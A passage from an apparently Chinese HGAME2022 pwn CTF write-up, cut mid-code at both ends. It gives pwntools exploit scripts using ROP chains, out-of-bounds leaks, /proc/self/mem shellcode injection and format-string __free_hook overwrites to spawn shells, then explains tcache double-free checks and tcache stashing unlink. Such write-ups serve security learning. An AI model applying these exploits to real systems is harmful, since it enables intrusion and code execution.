class="number">3</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">100</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0xd0</span>)+p64(<span class="number">0</span>)+p64(getdents_addr)</span><br><span class="line"><span class="comment">#getdents(3,buf,0x50)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">100</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0xd0</span>)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line"><span class="comment">#write(1,buf,0x50)</span></span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\x30\x00\x08&#x27;</span>)</span><br><span class="line">file_name = r.recv(<span class="number">24</span>)</span><br><span class="line">log.success(<span class="string">&quot;filename:&quot;</span>+file_name)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(&quot;filename&quot;,0,0)</span></span><br><span class="line"><span class="comment">#read(4,buf,0x100)</span></span><br><span class="line"><span class="comment">#write(1,buf,0x100)</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(f.bss()+<span class="number">100</span>+<span class="number">0xa3</span>)+p64(pop_rsi)+p64(<span class="number">0x0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(pop_rax)+p64(<span class="number">2</span>)+p64(ret)+p64(syscall_ret)+p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">0x100</span>)+p64(pop_rdx_rbx)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">0x100</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(write_addr)+p64(main_addr)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ser-per-fa">ser_per_fa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;zsh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./spfa&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">45430</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./spfa&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line"><span class="comment">#https://blog.csdn.net/chennbnbnb/article/details/104035261  得到栈地址</span></span><br><span class="line">backd00r_addr = <span class="number">0x16AA</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;how many datas?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(-(<span class="number">0xB720</span> - <span class="number">0x6F80</span>)/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr - libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak programme base</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(-(<span class="number">0xB720</span> - <span class="number">0x7008</span>)/<span class="number">8</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">pie_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">spfa_base = pie_addr - <span class="number">0x7008</span></span><br><span class="line">log.success(<span class="string">&quot;spfa_base:&quot;</span> + <span class="built_in">hex</span>(spfa_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack_addr</span></span><br><span class="line">env_addr = lbase + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(env_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>((env_addr-spfa_base-<span class="number">0xB720</span>)/<span class="number">8</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot; is &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">stack_ret = stack_addr-<span class="number">0x100</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;edges?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\nformat&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bias = (stack_ret-spfa_base-<span class="number">0xB720</span>)/<span class="number">8</span></span><br><span class="line">r.sendline(<span class="string">&quot;0 &quot;</span>+<span class="built_in">str</span>(bias)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(spfa_base+backd00r_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;node?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;to ?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="week2">week2</h2><h3 id="blind">blind</h3><p>​proc 文件系统，根据题目提示的 “喷射” 找到 <a href="https://xz.aliyun.com/t/7189?page=34">https://xz.aliyun.com/t/7189?page=34</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;chuj.top&quot;</span>, <span class="number">51693</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">hash_code = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">charset = string.printable</span><br><span class="line">proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;write: &quot;</span>)</span><br><span class="line">write_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&quot;\n&quot;</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">lbase = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">libc_start_main = lbase+libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;/proc/self/mem&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x90&quot;</span>*<span class="number">0x2fd0</span>+asm(shellcraft.sh())<span class="comment">#添加 slide code 增加执行 shellcode 的概率</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.send(<span class="built_in">str</span>(libc_start_main))<span class="comment">#执行完会返回到 libc_start_main</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo-sever">echo_sever</h3><p>​堆上的格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./echo&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52061</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%6$p-%13$p&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">rbp = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;-&quot;</span>).strip(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr - libc.symbols[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((rbp+<span class="number">0x18</span>+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%6$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((rbp+<span class="number">0x18</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%6$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((system_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%13$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%13$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((free_hook)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%10$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((system_addr)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&quot;%13$hn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="oldfashion-note">oldfashion_note</h3><h4 id="思路-2">思路</h4><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220212172253010.png" class=""><p>程序有add，delete，show这几个功能，delete 函数中未将指针置零，存在 UAF 漏洞</p><p>首先要利用 show 功能 leak 出 libc 基址，此处用到 <code>Unsorted Bin Leak</code>（首先要填满 tcache 才能通过 free 进入 unsorted bin）</p><p>获得 libc 基址后考虑劫持钩子函数 <code>__free_hook</code> 为 <code>system</code>，因为题目使用的库版本是 <code>libc-2.31.so</code> 所以 <code>tcache</code> 的 <code>double free</code> 会有检测（libc2.29以上的版本），可通过 <code>stash</code> 绕过</p><h4 id="tcache相关">tcache相关</h4><blockquote><p>当所请求的分配大小不大于<code>0x408</code>并且当<strong>给定大小</strong>的 tcache bin 未满时调用 <code>tcache_put</code>。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">   <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span><span class="comment">//新增的check字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely coincidence</span></span><br><span class="line"><span class="comment">       before aborting.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))<span class="comment">//check</span></span><br><span class="line">      &#123;</span><br><span class="line">       tcache_entry *tmp;</span><br><span class="line">       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">            tmp;</span><br><span class="line">            tmp = tmp-&gt;next)</span><br><span class="line">         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><code>double free</code> 会将 key 字段置为 tcache，无法通过上面的检测</p><p>为了绕过这一检测大致有两种方法：</p><ol><li>修改 key 字段</li><li><code>tcache stashing unlink attack</code></li></ol><p>如果程序有 edit 功能的话就可以修改 key 字段来绕过检测，但本题没有提供所以考虑 <code>tcache stashing unlink attack</code></p><blockquote><p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 或 fast bin 会放进 tcache 中，<strong>在获取到一个 <code>small bin/fast bin</code> 中的一个 chunk 后如果 tcache 仍有足够空闲位置，会将剩余的 <code>small bin/fast bin</code> 链入 tcache</strong> ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针 或 fast bin 的 fd 指针时，其可以在任意地址上写一个 libc 地址</p></blockquote><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220212205918419.png" class="" title="image-20220212205918419"><p>先将相同大小的 tcache 清空，以便分配到 fast bin 的堆块</p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220212210405503.png" class="" title="image-20220212210405503"><p>分配 <code>fast bin</code> 中的堆块，剩下的部分链入 tcache</p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220212210556170.png" class="" title="image-20220212210556170"><h4 id="Unsorted-bin-leak">Unsorted bin leak</h4><p>​    unsorted bin 结构如下，是循环双向链表</p><img src="/2022/02/18/HGAME2022-Pwn-wp/unsortedbins-struct.jpg" class=""><p>​    可以看出 show bin2 中的内容就可以获得 <code>main_arena</code> 内的一个地址（要防止与 <code>top chunk</code> 合并），而 <code>main_arena</code> 与 <code>__malloc_hook</code> 固定差 0x10 从而计算得到 libc 基址</p><h4 id="fast-bin-attack">fast bin attack</h4><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220212180348216.png" class=""><p>​    之后重新分配堆块得到 chunk1 ，将其 fd 指针置为 <code>fake chunk</code> 就可以实现任意写</p><h4 id="exp-2">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 